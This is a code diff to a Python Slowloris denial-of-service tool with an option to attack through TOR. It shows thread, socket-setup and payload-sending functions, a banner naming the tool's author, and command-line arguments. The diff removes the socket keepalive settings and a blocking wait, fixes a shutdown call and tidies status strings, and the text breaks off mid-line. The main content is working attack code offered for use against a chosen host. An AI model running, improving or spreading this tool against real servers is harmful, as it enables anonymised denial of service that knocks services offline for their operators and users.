@@ -21,11 +21,6 @@ def slowloris():
         print_status()
         start_attack_thread(host, port)
 
-        try:
-            interruptable_event().wait()
-        except KeyboardInterrupt:
-            sys.exit(0)
-
 def start_attack_thread(host, port):
     i = 0
     while i < args.threads:
@@ -56,14 +51,6 @@ def setup_attack(host, port):
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
 
-            if sys.platform == 'linux' or sys.platform == 'linux2':
-                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 1)
-                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, args.interval)
-            elif sys.platform == 'darwin':
-                sock.setsockopt(socket.IPPROTO_TCP, 0x10, args.interval)
-            elif sys.platform == 'win32':
-                sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, args.keepalive * 1000, args.interval * 1000))
-
             sock.settimeout(5)
             sockets.append(sock)
 
@@ -92,7 +79,7 @@ def send_payload(sock, host, port):
         sock.connect((host, port))
         sock.sendall(payload.encode('utf-8'))
     except (AttributeError, socks.ProxyConnectionError):
-        print_status('waiting for TOR\u2026')
+        print_status('waiting for TOR...')
         return True
     except Exception as e:
         send_payload.amount_failed += 1
@@ -113,7 +100,7 @@ def print_target(host, port):
 def print_status(str_extra=None):
     str_success = '\033[92mPayloads successful: %i' % send_payload.amount_success
     str_and = '\033[90m, '
-    str_failed = '\033[91mpayloads failed: %i' % send_payload.amount_failed
+    str_failed = '\033[91mPayloads failed: %i' % send_payload.amount_failed
     str_extra = ('\033[0m, ' + str_extra if str_extra else '')
 
     print(str_success + str_and + str_failed + str_extra + '\033[0m', end='\r')
@@ -122,7 +109,7 @@ def print_status(str_extra=None):
 def disconnect_sockets(sockets):
     for sock in sockets:
         try:
-            sock.shutdown(SHUT_RDWR)
+            sock.shutdown(socket.SHUT_RDWR)
         except:
             pass
         finally:
@@ -151,12 +138,11 @@ if __name__ == '__main__':
     print(r"|  __/| |/\| | . ` || |   | | | |    /  | |  `--. \ ")
     print(r"| |   \  /\  / |\  || |___\ \_/ / |\ \ _| |_/\__/ /")
     print(r"\_|    \/  \/\_| \_/\_____/\___/\_| \_|\___/\____/ ")
-    print(r"updated slowloris DOS tool by Jeanpseven(Wrench)")
+    print(r"Slowloris DOS tool by Jeanpseven (Wrench)")
     print("\033[0m\n", flush=True)
 
     parser = argparse.ArgumentParser()
     parser.add_argument('host', metavar='Host', nargs=None, help='host to be tested')
     parser.add_argument('-t', '--tor', help='enable to attack through TOR', action="store_true")
     parser.add_argument('-n', dest='threads', type=int, default=8, nargs='?', help='number of threads (default 8)', action="store")
-    parser.add_argument('-k', dest='keepalive', type=int, default=90, nargs='?', help='seconds to keep connection alive (default 90)', action="store")
-    parser.add_argument('-i', dest='interval', type=int, default=5, nargs='?',
+    parser.add
